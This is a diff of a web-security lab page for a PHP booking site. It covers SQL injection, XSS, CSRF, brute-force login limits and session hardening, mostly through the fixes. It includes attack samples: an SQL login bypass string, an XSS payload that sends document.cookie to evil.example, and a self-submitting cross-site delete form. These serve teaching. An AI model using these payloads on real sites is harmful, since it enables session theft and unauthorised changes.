@@ -10,889 +10,714 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
     integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
     crossorigin="anonymous" referrerpolicy="no-referrer" />
-  <title>Lab 10: Securing your web application</title>
+  <title>Lab 9: Securing your web application</title>
 </head>
 
 <body>
   <main>
-    <h1 class="Title">Lab 10: Securing your web application</h1>
+    <h1 class="Title">Lab 9: Securing your web application</h1>
     <section>
       <h2 class="Section_Title">Instructions</h2>
       <div class="Instructions">
         <p>
-          In this lab, your team performs a hands-on security audit of its own project. For every web service (each
-          CRUD operation), you will look for the most common web vulnerabilities: SQL injection, Cross-Site Scripting
-          (XSS), Cross-Site Request Forgery (CSRF), weak password storage, insecure sessions, missing authorization
-          checks, unsafe file uploads and leaked secrets. You will fix what you find, record everything in an audit
-          report, and finally audit another team's project. The theory behind this lab is covered in the lectures
-          <a href="Security.html">Security</a> and <a href="Sessions_Cookies.html">Sessions and Cookies</a>; read them
-          before you start.
+          <strong>Syaha</strong> already protects itself against many attacks: prepared statements since
+          <a href="Lab_5.html">Lab 5</a>, escaped output, server validation and safe uploads since
+          <a href="Lab_6.html">Lab 6</a>, hashed passwords and protected pages since <a href="Lab_7.html">Lab 7</a>.
+          In this lab you audit it like an attacker, one risk at a time, and close the holes that remain: forms that
+          another website can post, a login that can be attacked from many sessions, errors that tell too much,
+          missing security headers and passwords written in Git. Then you audit your team project, and another team
+          audits it too.
         </p>
       </div>
     </section>
-    <section id="Audit_Setup">
+    <section id="Overview">
       <h2 class="Section_Title">I. Preparing the audit</h2>
       <div class="Definitions">
-        <p>
-          A security audit is a systematic review: you do not just "look around", you list every entry point of your
-          application and check each one against the same list of attacks. An entry point is anything that receives
-          data from the user: a form, a URL parameter (<code>?id=</code>), a cookie, an uploaded file or an AJAX
-          request. Remember the golden rule from the lecture: <strong>never trust user input</strong>, and that
-          includes the data sent by your own JavaScript, because anyone can modify or replay a request with the
-          browser DevTools.
-        </p>
+        <div>
+          The result is in <a href="SRC/Labs/Lab_9/" target="_blank" rel="noopener">SRC/Labs/Lab_9</a>: a copy of the back end of <a href="Lab_7.html">Lab 7</a> with the fixes of this lab:<table><tr><th>File</th><th>Change</th></tr><tr><td><code>includes/security.php</code></td><td><strong>new</strong>: errors, HTTP security headers, CSRF tokens; included by <code>auth.php</code>, so by every page</td></tr><tr><td><code>includes/error_page.php</code></td><td><strong>new</strong> (replaces <code>forbidden.php</code>): the 403 and 500 pages</td></tr><tr><td>13 forms (public pages, login, admin...)</td><td>a hidden CSRF token: <code>&lt;?= csrf_field() ?&gt;</code></td></tr><tr><td><code>includes/auth.php</code>, <code>login.php</code>, <code>database/syaha.sql</code></td><td>too many wrong passwords counted in the table <code>login_attempts</code></td></tr><tr><td><code>cancel_booking.php</code>, <code>my_bookings.php</code></td><td><strong>new</strong>: a customer cancels a pending booking (authorization of an action)</td></tr><tr><td><code>includes/config.php</code>, <code>config.local.example.php</code>, <code>.gitignore</code></td><td>the secrets out of Git, <code>APP_DEBUG</code></td></tr><tr><td><code>includes/db.php</code></td><td>connection errors handled by <code>security.php</code></td></tr><tr><td><code>admin/admin.js</code>, <code>admin/footer.php</code></td><td>no inline script (Content-Security-Policy)</td></tr><tr><td><code>.htaccess</code> files</td><td><code>includes/</code> and <code>database/</code> cannot be opened with a URL, no folder listing</td></tr></table>
+        </div>
       </div>
-      <h3 class="Sub_Section_Title">Step 1: list your services and entry points</h3>
       <div class="Definitions">
         <p>
-          Create a branch for the audit and a file <code>SECURITY_AUDIT.md</code> at the root of your repository.
-          In this file, list each of your (at least 5) web services, the PHP file(s) that implement it, the HTTP
-          method, the parameters it receives and who is allowed to use it (visitor, logged-in user, owner, admin).
+          Import <code>SRC/Labs/Lab_9/database/syaha.sql</code> again (it adds the table <code>login_attempts</code>), then open <code>http://localhost/&lt;project folder&gt;/SRC/Labs/Lab_9/index.php</code>. The demo accounts are the ones of Lab 7.
         </p>
       </div>
-      <div class="Code_Block">
-        <pre class="prettyprint lang-bash">
-git checkout main
-git pull
-git checkout -b security-audit
-# create SECURITY_AUDIT.md, then commit it
-git add SECURITY_AUDIT.md
-git commit -m "Add security audit inventory of web services"
-        </pre>
+      <h3 class="Sub_Section_Title">Step 1: list the entry points</h3>
+      <div class="Definitions">
+        <div>
+          An attacker does not care about your pages: they care about every place where your server <strong>receives</strong> something. List them before testing anything. For Syaha:<table><tr><th>Entry point</th><th>Method</th><th>Data received</th><th>Who can use it</th></tr><tr><td><code>services.php</code></td><td>GET</td><td><code>max_price</code>, <code>max_days</code>, <code>sort</code></td><td>everybody</td></tr><tr><td><code>contact_us.php</code></td><td>POST</td><td>name, e-mail, phone, subject, message</td><td>everybody</td></tr><tr><td><code>book.php</code></td><td>GET / POST</td><td>trip id, name, e-mail, date, people, return page</td><td>everybody</td></tr><tr><td><code>login.php</code>, <code>register.php</code></td><td>POST</td><td>e-mail, password, name, <code>next</code></td><td>visitors</td></tr><tr><td><code>logout.php</code></td><td>POST</td><td>nothing</td><td>logged in</td></tr><tr><td><code>my_bookings.php</code>, <code>cancel_booking.php</code></td><td>GET / POST</td><td>booking id</td><td>customers</td></tr><tr><td><code>admin/trip_form.php</code></td><td>GET / POST</td><td>trip id, every field, a photo file</td><td>admins</td></tr><tr><td><code>admin/trip_delete.php</code>, <code>bookings.php</code>, <code>messages.php</code></td><td>POST</td><td>ids, status</td><td>admins</td></tr><tr><td>every request</td><td>-</td><td>cookies: <code>SYAHA_SESSION</code>, <code>syaha_email</code></td><td>everybody</td></tr></table>
+        </div>
       </div>
-      <div class="Code_Block">
-        <pre class="prettyprint">
-# Security audit - Team X
-
-| Service           | File(s)                    | Method | Parameters              | Allowed users   |
-|-------------------|----------------------------|--------|-------------------------|-----------------|
-| Create a product  | products/create.php        | POST   | name, price, image      | admin           |
-| List products     | products/list.php (AJAX)   | GET    | q, page                 | everyone        |
-| Edit a product    | products/edit.php          | POST   | id, name, price         | admin           |
-| Delete a product  | products/delete.php        | POST   | id                      | admin           |
-| Post a review     | reviews/create.php         | POST   | product_id, text        | logged-in user  |
-        </pre>
+      <div class="Definitions">
+        <p>
+          For each line, ask the questions of the next sections: can the data change a query (SQL injection), can it come back in a page (XSS), can another site send it (CSRF), is the user allowed to do it (authorization), what if it is huge, empty, or a file?
+        </p>
       </div>
-      <div class="Note"><strong>Important:</strong> all the attack examples of this lab must be tried <strong>only on
-          your own local copy</strong> (XAMPP on your machine) or on a copy of a classmate's project they agreed to
-        share with you. Attacking a real website without written permission is illegal.</div>
     </section>
     <section id="SQL_Injection">
       <h2 class="Section_Title">II. SQL injection</h2>
       <div class="Definitions">
         <p>
-          SQL injection happens when user input is pasted directly into the text of an SQL query. The attacker then
-          writes SQL instead of data and changes the meaning of the query. Search your code for every query built
-          with string concatenation or variables inside a double-quoted string (<code>"... '$email' ..."</code>).
+          SQL injection happens when a value sent by the visitor is pasted <em>inside</em> the SQL code:
         </p>
       </div>
-      <h3 class="Sub_Section_Title">The vulnerable version</h3>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// login.php - VULNERABLE, do not use
-$email    = $_POST['email'];
-$password = $_POST['password'];
+// VULNERABLE: the value typed by the visitor becomes part of the SQL code
+$email = $_POST['email'];
+$user = db()-&gt;query("SELECT * FROM users WHERE email = '$email'")-&gt;fetch();
 
-$conn = mysqli_connect('localhost', 'root', '', 'shop');
-$sql  = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
-$result = mysqli_query($conn, $sql);
+// the attacker types:     ' OR 1=1 --
+// the query becomes:      SELECT * FROM users WHERE email = '' OR 1=1 -- '
+//                         -&gt; the first account of the table (the admin), without any password
+        </pre>
+      </div>
+      <div class="Definitions">
+        <p>
+          Since Lab 5, every query of Syaha with an outside value uses a <strong>prepared statement</strong>: the query and the values travel separately, and a value can never change the query.
+        </p>
+      </div>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-php">
+// SAFE: the SQL is sent first, the values separately; a value can never become SQL code
+$statement = db()-&gt;prepare('SELECT * FROM users WHERE email = ?');
+$statement-&gt;execute([$email]);
+        </pre>
+      </div>
+      <div class="Definitions">
+        <p>
+          The only part of a query that cannot be a placeholder is a name (a column, a direction): <code>ORDER BY</code> takes its column from a fixed list, never from the URL:
+        </p>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/queries.php (extract)</p>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-php">
+/**
+ * Published trips filtered by the search form of the services page (Lab 6).
+ * $max_price and $max_days are null when the visitor did not choose them.
+ */
+function search_trips(?int $max_price, ?int $max_days, string $sort): array
+{
+    // ORDER BY cannot use a placeholder: the column comes from this fixed list, never from the visitor
+    $orders = [
+        'price_asc' =&gt; 'price ASC',
+        'price_desc' =&gt; 'price DESC',
+        'duration' =&gt; 'duration_days ASC, price ASC',
+    ];
+    $order = $orders[$sort] ?? 'id';
 
-if (mysqli_num_rows($result) &gt; 0) {
-    echo 'Welcome!';
+    // the conditions are added only when needed; the values always go through placeholders
+    $where = ['is_published = 1'];
+    $parameters = [];
+    if ($max_price !== null) {
+        $where[] = 'price &lt;= :max_price';
+        $parameters['max_price'] = $max_price;
+    }
+    if ($max_days !== null) {
+        $where[] = 'duration_days &lt;= :max_days';
+        $parameters['max_days'] = $max_days;
+    }
+
+    $statement = db()-&gt;prepare('SELECT * FROM trips WHERE ' . implode(' AND ', $where) . ' ORDER BY ' . $order);
+    $statement-&gt;execute($parameters);
+    return $statement-&gt;fetchAll();
 }
         </pre>
       </div>
       <div class="Definitions">
         <p>
-          Try it on your local copy: type <code>' OR '1'='1' -- </code> (with a space after the two dashes) in the
-          email field and anything in the password field. The query becomes
-          <code>SELECT * FROM users WHERE email = '' OR '1'='1' -- ' AND password = '...'</code>: the condition is
-          always true and the rest is a comment, so you are logged in without knowing any password. The same trick
-          can be used to read or delete whole tables.
-        </p>
-      </div>
-      <h3 class="Sub_Section_Title">The fix: PDO prepared statements</h3>
-      <div class="Definitions">
-        <p>
-          With a prepared statement, the query and the data are sent separately to MySQL. The query contains
-          placeholders (<code>?</code> or <code>:name</code>) and the values are bound later, so they can never be
-          interpreted as SQL. Put the connection in a single file that every service includes.
+          To audit a project, search every query that contains a variable, and check each one:
         </p>
       </div>
       <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;?php
-// includes/db.php - one shared connection for the whole project
-$config = require __DIR__ . '/../config.php'; // see section VII (secrets out of Git)
-
-$pdo = new PDO(
-    "mysql:host={$config['db_host']};dbname={$config['db_name']};charset=utf8mb4",
-    $config['db_user'],
-    $config['db_pass'],
-    [
-        PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION,
-        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
-        PDO::ATTR_EMULATE_PREPARES   =&gt; false,
-    ]
-);
+        <pre class="prettyprint lang-bash">
+# every query built with a variable inside: each line must be checked by hand
+grep -rn -E "(query|prepare|exec)\(.*\$" --include=*.php .
         </pre>
       </div>
-      <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;?php
-// login.php - SAFE
-require __DIR__ . '/includes/db.php';
-
-$email    = trim($_POST['email'] ?? '');
-$password = $_POST['password'] ?? '';
-
-$stmt = $pdo-&gt;prepare('SELECT id, name, role, password_hash FROM users WHERE email = ?');
-$stmt-&gt;execute([$email]);
-$user = $stmt-&gt;fetch();
-
-if ($user &amp;&amp; password_verify($password, $user['password_hash'])) {
-    // login succeeded (see section V for the session part)
-} else {
-    $error = 'Invalid email or password.';
-}
-
-// Named placeholders work too:
-$stmt = $pdo-&gt;prepare('UPDATE products SET name = :name, price = :price WHERE id = :id');
-$stmt-&gt;execute(['name' =&gt; $name, 'price' =&gt; $price, 'id' =&gt; $id]);
-        </pre>
-      </div>
-      <div class="Note"><strong>Tip:</strong> placeholders can only replace <em>values</em>, not table or column
-        names. If the user chooses a sort column (<code>?sort=price</code>), check it against a whitelist:
-        <code>$sort = in_array($_GET['sort'] ?? '', ['name', 'price', 'created_at'], true) ? $_GET['sort'] :
-          'name';</code>. If your project uses mysqli instead of PDO, use <code>mysqli_prepare()</code> and
-        <code>mysqli_stmt_bind_param()</code>; the principle is the same.</div>
+      <div class="Note"><strong>Also checked:</strong> <code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code> in <code>db.php</code>: real prepared statements, done by MySQL itself.</div>
     </section>
     <section id="XSS">
       <h2 class="Section_Title">III. Cross-Site Scripting (XSS)</h2>
       <div class="Definitions">
         <p>
-          XSS happens when user data is inserted into a page as HTML, so the browser executes it. In a
-          <strong>reflected</strong> XSS, the payload comes from the current request (for example a search term in
-          the URL) and is echoed back. In a <strong>stored</strong> XSS, the payload is saved in the database (a
-          comment, a username, a product description) and executed for every visitor who views it. The injected
-          script runs with the victim's session: it can read the page, send requests in their name or redirect them.
+          XSS happens when a text sent by a visitor is written in a page as HTML: the browser of the next visitor runs it. In Syaha, the messages of the contact form are read by the admin: the most interesting target.
         </p>
       </div>
-      <h3 class="Sub_Section_Title">Find the problem</h3>
       <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;?php
-// search.php - VULNERABLE (reflected XSS)
-echo "&lt;p&gt;Results for: " . $_GET['q'] . "&lt;/p&gt;";
+        <pre class="prettyprint lang-html">
+&lt;!-- VULNERABLE: the name typed in the contact form is written as HTML in the admin area --&gt;
+&lt;td&gt;&lt;?= $message['full_name'] ?&gt;&lt;/td&gt;
 
-// product.php - VULNERABLE (stored XSS)
-foreach ($reviews as $review) {
-    echo "&lt;div class='review'&gt;&lt;b&gt;{$review['author']}&lt;/b&gt;: {$review['text']}&lt;/div&gt;";
-}
+&lt;!-- the attacker sends the name:   &lt;script&gt;fetch('https://evil.example/?c=' + document.cookie)&lt;/script&gt;
+     the script runs in the browser of the admin, with the rights of the admin --&gt;
         </pre>
       </div>
       <div class="Definitions">
         <p>
-          Test it locally: open <code>search.php?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>, and post a review
-          whose text is <code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code>. If an alert box appears,
-          the service is vulnerable.
-        </p>
-      </div>
-      <h3 class="Sub_Section_Title">The fix in PHP: escape on output</h3>
-      <div class="Definitions">
-        <p>
-          Store the data as the user typed it, but <strong>escape it every time you print it</strong> in HTML with
-          <code>htmlspecialchars($value, ENT_QUOTES, 'UTF-8')</code>. This converts <code>&lt; &gt; &amp; " '</code>
-          into HTML entities, so the browser displays them as text. <code>ENT_QUOTES</code> is required to protect
-          attribute values written between single quotes. Define a short helper and use it everywhere.
+          Every value written in a page goes through <code>e()</code> (<code>htmlspecialchars</code>), including the values put back in the fields of a sticky form and the flash messages:
         </p>
       </div>
       <div class="Code_Block">
+        <pre class="prettyprint lang-html">
+&lt;td&gt;&lt;?= e($message['full_name']) ?&gt;&lt;/td&gt;   &lt;!-- &amp;lt;script&amp;gt; is shown as text --&gt;
+        </pre>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/functions.php (extract)</p>
+      <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// includes/functions.php
+/** Escapes a value before writing it in the HTML: protects the page against XSS. */
 function e(?string $value): string
 {
     return htmlspecialchars($value ?? '', ENT_QUOTES, 'UTF-8');
 }
         </pre>
       </div>
-      <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;?php require __DIR__ . '/includes/functions.php'; ?&gt;
-&lt;p&gt;Results for: &lt;?= e($_GET['q'] ?? '') ?&gt;&lt;/p&gt;
-
-&lt;?php foreach ($reviews as $review): ?&gt;
-  &lt;div class="review"&gt;
-    &lt;b&gt;&lt;?= e($review['author']) ?&gt;&lt;/b&gt;: &lt;?= e($review['text']) ?&gt;
-  &lt;/div&gt;
-&lt;?php endforeach; ?&gt;
-
-&lt;input type="text" name="name" value="&lt;?= e($product['name']) ?&gt;"&gt;
-        </pre>
-      </div>
-      <h3 class="Sub_Section_Title">The fix in JavaScript: textContent instead of innerHTML</h3>
       <div class="Definitions">
         <p>
-          Your AJAX services return JSON, and the escaping must then happen in JavaScript. Never put user data in
-          <code>innerHTML</code> (or jQuery's <code>.html()</code>, or <code>insertAdjacentHTML</code>). Create the
-          elements and assign the data with <code>textContent</code> (or jQuery's <code>.text()</code>), which never
-          interprets HTML.
+          JavaScript has the same problem with <code>innerHTML</code>: use it only with fixed HTML written by you, never with data. The scripts of Syaha only use <code>innerHTML</code> for icons; the texts use <code>textContent</code>:
         </p>
       </div>
       <div class="Code_Block">
         <pre class="prettyprint lang-js">
-// VULNERABLE: the review text is parsed as HTML
-list.innerHTML += `&lt;li&gt;&lt;b&gt;${review.author}&lt;/b&gt;: ${review.text}&lt;/li&gt;`;
+// VULNERABLE in JavaScript too: a text from the server or the visitor inserted as HTML
+Card.innerHTML = `&lt;h3&gt;${Trip.title}&lt;/h3&gt;`;
 
-// SAFE: the data is inserted as plain text
-const li = document.createElement('li');
-const author = document.createElement('b');
-author.textContent = review.author;
-li.append(author, ': ' + review.text); // append() with a string creates a text node
-list.appendChild(li);
-
-// SAFE with jQuery
-$('&lt;li&gt;').append($('&lt;b&gt;').text(review.author), document.createTextNode(': ' + review.text)).appendTo('#list');
+// SAFE: textContent never interprets HTML
+const Title = document.createElement("h3");
+Title.textContent = Trip.title;
+Card.appendChild(Title);
         </pre>
       </div>
-      <div class="Note"><strong>Tip:</strong> escaping is also needed in URLs and in links. A user-supplied link such
-        as <code>javascript:alert(1)</code> is dangerous inside <code>href</code> even after
-        <code>htmlspecialchars</code>; accept only links that start with <code>https://</code> or
-        <code>http://</code>. The Content-Security-Policy header of section VII adds a second layer of protection.
-      </div>
+      <div class="Note"><strong>Second line of defence:</strong> the Content-Security-Policy of Section VIII forbids inline scripts: even a forgotten <code>e()</code> could not run <code>&lt;script&gt;</code>.</div>
     </section>
     <section id="CSRF">
       <h2 class="Section_Title">IV. Cross-Site Request Forgery (CSRF)</h2>
       <div class="Definitions">
         <p>
-          The browser automatically sends your session cookie with every request to your site, even when the request
-          is triggered by another website. A malicious page can therefore contain a hidden form that posts to
-          <code>http://localhost/project/products/delete.php</code>: if an admin visits that page while logged in,
-          the product is deleted with the admin's rights. The defense is a secret token that the attacker's page
-          cannot know: it is stored in the session and must be sent back with every request that changes data.
+          A logged-in admin visits another website. That website contains a hidden form that posts itself to Syaha. The browser adds the session cookie, as for every request to Syaha: the request is <em>authenticated</em>, but the admin never wanted it.
         </p>
       </div>
-      <h3 class="Sub_Section_Title">Generate one token per session</h3>
+      <div class="Code_Block">
+        <pre class="prettyprint lang-html">
+&lt;!-- on https://evil.example: the visitor only opens the page, the form is posted by itself --&gt;
+&lt;form action="http://localhost/&lt;project folder&gt;/SRC/Labs/Lab_7/admin/trip_delete.php" method="post"&gt;
+    &lt;input type="hidden" name="id" value="3"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;!-- if the visitor is an admin logged in to Syaha, the browser sends the session cookie with the form:
+     for Syaha, it is a real request of the admin, and the trip is deleted --&gt;
+        </pre>
+      </div>
+      <div class="Definitions">
+        <p>
+          <code>SameSite=Lax</code> (Lab 7) already stops most modern browsers from sending the cookie with this form, but it depends on the browser and does not protect against a page of the same site. The real protection is a <strong>CSRF token</strong>: a random secret, kept in the session, that every form must send back. Another website cannot read it, so it cannot write it in its form.
+        </p>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/security.php (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// includes/csrf.php (include it after session_start())
+// ------------------------------------------------------------------ CSRF tokens
+
+require_once __DIR__ . '/session.php';
+
+/** The secret token of the session: random, unknown to other websites. */
 function csrf_token(): string
 {
     if (empty($_SESSION['csrf_token'])) {
-        $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // 64 hexadecimal characters
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
     }
     return $_SESSION['csrf_token'];
 }
 
-function csrf_check(): void
+/** The hidden field to put in EVERY form sent with POST. */
+function csrf_field(): string
 {
-    $sent = $_POST['csrf_token'] ?? $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
-    if (!is_string($sent) || !hash_equals(csrf_token(), $sent)) {
-        http_response_code(403);
-        exit('Invalid CSRF token.');
+    return '&lt;input type="hidden" name="csrf_token" value="' . csrf_token() . '" /&gt;';
+}
+
+// every POST request is checked here, before the page runs: a form posted by another website has no token
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $sent = $_POST['csrf_token'] ?? '';
+    if (!is_string($sent) || !hash_equals(csrf_token(), $sent)) {   // hash_equals: a comparison in constant time
+        error_log('CSRF check failed for ' . $_SERVER['REQUEST_URI']);
+        $_SESSION['flash'][] = ['Error', 'انتهت صلاحية النموذج أو لم يُرسل من موقعنا. أعيدوا المحاولة.'];
+        header('Location: ' . $_SERVER['REQUEST_URI'], true, 303);  // the same page, with GET: nothing is changed
+        exit;
     }
 }
         </pre>
       </div>
-      <h3 class="Sub_Section_Title">Add the token to every form and check it</h3>
+      <div class="Definitions">
+        <div>
+          <ul><li>The check is done <strong>once, for every POST request</strong>, in a file that every page includes: a new form cannot be forgotten. The page itself does not even run.</li><li><code>hash_equals()</code> compares in constant time: the time taken does not reveal how many characters were right.</li><li>A refused form goes back to the same page with GET and a message: nothing is changed. It also happens to an honest visitor whose session expired.</li></ul>
+        </div>
+      </div>
+      <div class="Definitions">
+        <p>
+          Every form sent with POST gets the hidden field, for example the logout button of the menu:
+        </p>
+      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/header.php (extract)</p>
       <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;form action="products/delete.php" method="post"&gt;
-  &lt;input type="hidden" name="csrf_token" value="&lt;?= e(csrf_token()) ?&gt;"&gt;
-  &lt;input type="hidden" name="id" value="&lt;?= (int) $product['id'] ?&gt;"&gt;
-  &lt;button type="submit"&gt;Delete&lt;/button&gt;
+        <pre class="prettyprint lang-html">
+&lt;form action="logout.php" method="post" class="Logout_Form"&gt;
+    &lt;?= csrf_field() ?&gt;
+    &lt;button type="submit" class="Nav_Bar_Menu_Item" title="&lt;?= e($user['full_name']) ?&gt;"&gt;
+        &lt;span&gt;خروج&lt;/span&gt;
+        &lt;i class="fa-solid fa-right-from-bracket"&gt;&lt;/i&gt;
+    &lt;/button&gt;
 &lt;/form&gt;
         </pre>
       </div>
-      <div class="Code_Block">
-        <pre class="prettyprint lang-php">
-&lt;?php
-// products/delete.php
-session_start();
-require __DIR__ . '/../includes/csrf.php';
-
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(405);
-    exit('Method not allowed.');
-}
-csrf_check();
-// ... authorization check (section V), then the DELETE query
-        </pre>
-      </div>
-      <h3 class="Sub_Section_Title">AJAX requests</h3>
-      <div class="Definitions">
-        <p>
-          For AJAX, print the token once in a <code>&lt;meta&gt;</code> tag and send it in a custom header.
-          <code>csrf_check()</code> above already reads <code>$_SERVER['HTTP_X_CSRF_TOKEN']</code>.
-        </p>
-      </div>
-      <div class="Code_Block">
-        <pre class="prettyprint lang-js">
-// In the page head: &lt;meta name="csrf-token" content="&lt;?= e(csrf_token()) ?&gt;"&gt;
-const token = document.querySelector('meta[name="csrf-token"]').content;
-
-fetch('products/delete.php', {
-  method: 'POST',
-  headers: { 'X-CSRF-Token': token },
-  body: new URLSearchParams({ id: productId })
-})
-  .then(response =&gt; response.json())
-  .then(data =&gt; console.log(data));
-        </pre>
-      </div>
-      <div class="Note"><strong>Rules:</strong> (1) actions that change data (create, update, delete, logout) must
-        never be done with a GET request or a simple link; (2) compare tokens with <code>hash_equals()</code>, not
-        <code>==</code>, to avoid timing attacks; (3) set the session cookie with <code>SameSite=Lax</code> (or
-        <code>Strict</code>, see section V): modern browsers then do not send it with cross-site POST requests,
-        which is a second layer of protection, not a replacement for the token.</div>
+      <img class="Lab_Screenshot" src="SRC/IMAGES/Lab_9/Csrf_Refused.png" alt="A form posted without its token: refused, with a message" loading="lazy" />
+      <div class="Note"><strong>Remember:</strong> GET requests are never checked: this is why everything that changes data (delete, cancel, logout...) is a POST form since Lab 5. A link like <code>trip_delete.php?id=3</code> could be put in an <code>&lt;img&gt;</code> on any website.</div>
     </section>
-    <section id="Authentication_Authorization">
-      <h2 class="Section_Title">V. Passwords, sessions and authorization</h2>
-      <h3 class="Sub_Section_Title">Password storage</h3>
+    <section id="Authentication">
+      <h2 class="Section_Title">V. Passwords, sessions and brute force</h2>
+      <div class="Definitions">
+        <div>
+          Lab 7 already gave Syaha the essentials:<table><tr><th>Risk</th><th>Protection</th><th>Where</th></tr><tr><td>database stolen</td><td><code>password_hash()</code> / <code>password_verify()</code>, never the password itself</td><td><code>queries.php</code>, <code>login.php</code></td></tr><tr><td>accounts enumeration</td><td>the same message for a wrong e-mail and a wrong password</td><td><code>login.php</code></td></tr><tr><td>session stolen with JavaScript</td><td>cookie <code>HttpOnly</code></td><td><code>session.php</code></td></tr><tr><td>session fixation</td><td><code>use_strict_mode</code>, <code>session_regenerate_id()</code> at login</td><td><code>session.php</code>, <code>auth.php</code></td></tr><tr><td>session left open</td><td>idle timeout, real logout</td><td><code>session.php</code>, <code>auth.php</code></td></tr><tr><td>open redirect</td><td><code>safe_next()</code></td><td><code>auth.php</code></td></tr></table>
+        </div>
+      </div>
       <div class="Definitions">
         <p>
-          Passwords must never be stored in clear text, nor with fast hashes such as <code>md5()</code> or
-          <code>sha1()</code>, which can be cracked by billions of guesses per second. Use
-          <code>password_hash()</code>, which applies a slow algorithm (bcrypt by default) with a random salt, and
-          <code>password_verify()</code> to check a login. The result is up to 255 characters long, so the column
-          should be <code>VARCHAR(255)</code>.
+          One weakness remained: the counter of wrong passwords was kept <em>in the session</em>. An attacker simply deletes the cookie after each attempt and tries forever. In Lab 9 the failures are stored in the database, per e-mail <strong>and</strong> per IP address:
         </p>
       </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> database/syaha.sql (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-sql">
-ALTER TABLE users CHANGE password password_hash VARCHAR(255) NOT NULL;
+-- the wrong passwords of the last day (Lab 9): too many failures block the login for a while
+CREATE TABLE login_attempts (
+  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+  email VARCHAR(255) NOT NULL,
+  ip VARCHAR(45) NOT NULL,                -- 45 characters: long enough for an IPv6 address
+  attempted_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
+  INDEX (email, attempted_at),
+  INDEX (ip, attempted_at)
+) ENGINE=InnoDB;
         </pre>
       </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/auth.php (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// register.php
-$hash = password_hash($_POST['password'], PASSWORD_DEFAULT);
-$stmt = $pdo-&gt;prepare('INSERT INTO users (name, email, password_hash) VALUES (?, ?, ?)');
-$stmt-&gt;execute([$name, $email, $hash]);
-
-// login.php (after fetching $user with a prepared statement)
-if ($user &amp;&amp; password_verify($_POST['password'], $user['password_hash'])) {
-    if (password_needs_rehash($user['password_hash'], PASSWORD_DEFAULT)) {
-        $newHash = password_hash($_POST['password'], PASSWORD_DEFAULT);
-        $pdo-&gt;prepare('UPDATE users SET password_hash = ? WHERE id = ?')-&gt;execute([$newHash, $user['id']]);
-    }
-    // ... start the authenticated session (below)
-}
+// too many wrong passwords (Lab 9): counted in the database, so deleting the cookie does not reset them
+const LOGIN_WINDOW_MINUTES = 15;
+const LOGIN_MAX_FAILURES = 5;      // wrong passwords for one e-mail in 15 minutes
+const LOGIN_MAX_FAILURES_IP = 20;  // wrong passwords from one IP address in 15 minutes (any e-mail)
         </pre>
       </div>
-      <div class="Note"><strong>Tip:</strong> if your database already contains clear-text passwords, write a small
-        one-time script that replaces each of them with <code>password_hash()</code>, or simply recreate your test
-        accounts. Show the same message ("Invalid email or password") whether the email or the password is wrong.
-      </div>
-      <h3 class="Sub_Section_Title">Session security</h3>
-      <div class="Definitions">
-        <p>
-          The session cookie is the key to the account: if an attacker steals it, they are logged in. Configure the
-          cookie before <code>session_start()</code>, regenerate the session id at login (to prevent session
-          fixation), expire inactive sessions and destroy the session completely at logout. See the "Securing Session
-          INI Settings" part of the <a href="Security.html">Security</a> lecture for the meaning of each option.
-        </p>
-      </div>
+      <p class="File_Name"><i class="fa-solid fa-file-code"></i> includes/auth.php (extract)</p>
       <div class="Code_Block">
         <pre class="prettyprint lang-php">
-&lt;?php
-// includes/session.php - include this file at the top of EVERY page instead of calling session_start()
-ini_set('session.use_strict_mode', '1');
-ini_set('session.use_only_cookies', '1');
+// ------------------------------------------------------------------ too many wrong passwords (Lab 9)
 
-session_set_cookie_params([
-    'lifetime' =&gt; 0,                                   // cookie deleted when the browser closes
-    'path'     =&gt; '/',
-    'secure'   =&gt; !empty($_SERVER['HTTPS']),           // true as soon as the site uses HTTPS
-    'httponly' =&gt; true,                                // not readable from JavaScript (document.cookie)
-    'samesite' =&gt; 'Lax',
-]);
-session_start();
-
-const SESSION_TIMEOUT = 1800; // 30 minutes of inactivity
-
-if (isset($_SESSION['last_activity']) &amp;&amp; time() - $_SESSION['last_activity'] &gt; SESSION_TIMEOUT) {
-    session_unset();
-    session_destroy();
-    header('Location: login.php?expired=1');
-    exit;
-}
-$_SESSION['last_activity'] = time();
-        </pre>
-      </div>
